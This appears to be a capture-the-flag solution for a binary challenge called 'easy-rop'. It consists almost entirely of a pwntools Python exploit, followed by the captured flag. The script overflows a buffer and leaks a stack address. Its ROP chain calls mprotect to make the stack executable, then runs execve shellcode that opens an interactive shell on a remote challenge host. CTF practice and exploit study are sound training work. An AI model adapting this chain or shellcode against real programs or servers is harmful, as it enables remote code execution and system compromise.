exploit:
```python
from pwn import *

PADDING = b'A'*72
POP_RSI = 0x000000000040f4be #pop rsi; ret;
POP_RAX = 0x00000000004175eb #pop rax; ret;
POP_RDI = 0x000000000040191a #pop rdi; ret;
POP_RDX = 0x000000000040181f #pop rdx; ret;
MOV_RSI = 0x0000000000481e65 #mov qword ptr [rsi], rax; ret;
PUSH_RSP = 0x000000000041318e #push rsp; ret;
STACK_EXEC = 0x00000000004826d0 #_dl_make_stack_executable
STACK_PROT = 0x00000000004bfef0 #__stack_prot
LIBC_STACKEND = 0x00000000004bfa70 #__libc_stack_end
PUTS = 0x418B90
MAIN = 0x0000000000401de5
MPROTECT = 0x451ee0

shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

#p = process('./easy-rop')
p = remote('65.1.92.179', 49153)

print(p.recvuntil('name:').decode())


payload = PADDING
payload += p64(POP_RDI)
payload += p64(LIBC_STACKEND)
payload += p64(PUTS)
payload += p64(MAIN)

p.sendline(payload)
STACK_ADDR = int.from_bytes(p.recv(6), byteorder='little')&~(0xfff)  #recive leaked address and set to 0 last 3 byte in order to call mprotect
print(hex(STACK_ADDR))
print(p.recvuntil('name:').decode())

payload += p64(POP_RDX)
payload += p64(0x7)
payload += p64(POP_RSI)
payload += p64(0x1000)

payload += p64(POP_RDI)
payload += p64(STACK_ADDR)
payload += p64(MPROTECT)
payload += p64(PUSH_RSP)
payload += shellcode

p.sendline(payload)
p.interactive()
```
# FLAG
`darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}`
